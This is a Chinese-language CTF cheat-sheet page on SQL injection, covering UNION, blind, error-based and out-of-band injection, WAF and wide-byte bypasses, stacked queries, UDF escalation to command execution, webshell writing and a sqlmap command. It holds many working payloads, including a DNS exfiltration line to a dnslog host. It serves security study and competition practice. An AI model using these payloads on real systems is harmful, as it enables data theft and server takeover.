---
comments: true
---

# SQL注入

> WEB · 知识域。关系型数据库注入全谱系。标签:**基本注入**、**有回显注入**、**无回显盲注**、**WAF绕过注入**、**宽字节注入**、**报错注入**。

## 触发特征

- 参数拼接进查询、报错页泄露 SQL、过滤提示"关键字被拦截"。
- 数字型/字符型判定:`id=1 and 1=1` 差异、引号闭合观察。

## 基本注入

- 判定型: `' and 1=1-- -`、数字型免引号、`?id=2-1` 观察结果变化。
- UNION 流程:`order by N` 定列 → `union select` 回显位 → `information_schema.tables/columns` 取数据;SQLite 用 `sqlite_master`,PostgreSQL 用 `pg_tables`。
- 注释族:`-- -`、`#`、`/**/`、MySQL `;%00`。

## 有回显注入

- 联合查询直接回显;`group_concat` 聚合输出。
- 读写文件:`load_file('/flag')`、`into outfile` 写 webshell(需 secure_file_priv 与写权限)。
- EXIF 元数据注入:图片元数据参与入库后回显(29c3 CTF 2012)。

## 无回显盲注

- 布尔盲注:`and (select ascii(substr(user,1,1)))>N` 二分;LIKE 通配符逐字符爆破加速。
- 时间盲注:`sleep()`/`benchmark()`/SQLite `randomblob()` 计算拖时(SECCON 2017)。
- DNS/HTTP 外带(OOB):MySQL `load_file(concat('\\\\',hex,'.dnslog.cn'))`(Windows UNC)、Oracle `UTL_HTTP`。
- 报错盲注 → 见"报错注入";`REGEXP` 字节级 oracle 配反引号注释绕过(BSides Delhi 2018)。
- 查询竞态泄露:`information_schema.processlist` 感知并行查询(SECUINSIDE 2017)。

## 报错注入

- MySQL 三件套:`extractvalue(1,concat(0x7e,(select ...)))`、`updatexml`、`floor(rand()*2)` 主键重复。
- PostgreSQL:`CAST` 类型错误;MSSQL:`CONVERT`/`+=` 类型错;Oracle:`utl_inaddr.get_host_name`。
- `vsprintf` 双重预处理格式串注入(应用层把用户输入格式化进 SQL, AceBear 2018)。

## WAF绕过注入

- 空格替代:`/**/`、`%09/%0a/%0c`、括号包裹;关键字:`uni%23on`、大小写、双写 `uniunionon`、内联注释 `/*!50000select*/`。
- **宽字节注入**:GBK 环境引号转义 `%df'` 吃掉 `\` 形成有效汉字——国内特有考点,默认先试。
- 引号被过滤:十六进制 `0x61646d696e`、`char()`;**反斜杠逃逸**:注入 `\` 吞掉闭合引号改变语义。
- **双重关键词过滤**:如过滤 `or` 导致 `information` 变 `infMation`,用双写适配(DefCamp CTF 2016)。
- 关键词分片(分块拼接绕过,SecuInside 2013);BETWEEN 永真式替代比较符(DefCamp 2017)。
- PCRE 回溯限制:超长 payload 使 WAF 正则失效(SECUINSIDE 2017);XML 实体编码绕过(Crypto-Cat 套路)。
- Shift-JIS 等多字节编码 SQLi(Boston Key Party 2016)——宽字节思想的国际版。
- Host 头注入 + `PROCEDURE ANALYSE()`(DefCamp 2017);`ORDER BY CASE WHEN` 替代 WHERE 绕过滤(Sharif CTF 2016)。
- 二阶注入:注册→登录的存储型注入;INSERT 场列错位注入(CyberSecurityRumble 2016);`INSERT ... ON DUPLICATE KEY UPDATE` 覆盖密码(Midnight Sun CTF 2018)。
- 万能密码:`admin'-- -`、哈希永真 `' OR '1'='1`。

## 高级变体

- **堆叠注入(stack injections)**:`;` 多语句执行,依赖驱动是否支持(`mysqli_multi_query`、SQL Server 天然支持;Python 常用驱动默认禁)→ 新建用户/改数据直取。
- **无列名盲注**:表名列名被 WAF 或无权限时,用 `select '1','2' union select ...` 按位比较或 `substr((select concat(col1,col2) from t limit 1),1,1)` 逐位拖;`order by` 判列数 + 别名位移。
- **UDF提权**(MySQL → 系统):有 `secure_file_priv` 写权限与插件目录写权限时,写入 `lib_mysqludf_sys.so` → `create function sys_exec` → 命令执行(国内实战与 Web 题中"从 SQLi 到 shell"的直通车)。
- **文件操作**:`load_file('/flag')` 读、`into outfile/dumpfile` 写 webshell(需 secure_file_priv 与写权限;`dumpfile` 不加转义适合二进制)。
- MySQL 列截断:varchar 超长截断注册 `admin+空格` 伪造管理员(VolgaCTF 2014,约束攻击/约束漏洞族)。
- `sys.schema_table_statistics` / `mysql.innodb_table_stats` 替代被禁的 information_schema(N1CTF 2018)。
- 会话变量双值注入(MeePwn CTF 2017);QR 码内容进 SQL(H4ckIT CTF 2016)。
- **二次注入(存储型注入)**:恶意 payload 先存库(注册名/昵称),在另一处查询时被拼接执行——转义只发生在入库时,出库后无防护;盲注拖库同理可走存储通道。
- LDAP 注入通配符突破(CSAW 2018);XPath 盲注(BaltCTF 2013)。

## 盲注变体小结

- **布尔盲注(比较盲注)**:构造真/假条件观察页面差异,`ascii(substr())` 逐字符;LIKE 通配符加速。
- **无列名盲注**:连列名都不给,比较法/位移法直接拖数据。
- **时间盲注**:sleep/benchmark/randomblob 拖时(→ 无回显盲注节)。

## 工具速查

```bash
sqlmap -u "URL?id=1" --batch --dbs --tamper=space2comment
# 手注模板
' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
```

## 转向

- 拿到数据库 → 破 hash 登录 → [认证绕过](auth-bypass.md);写 shell → [文件上传](file-upload.md)
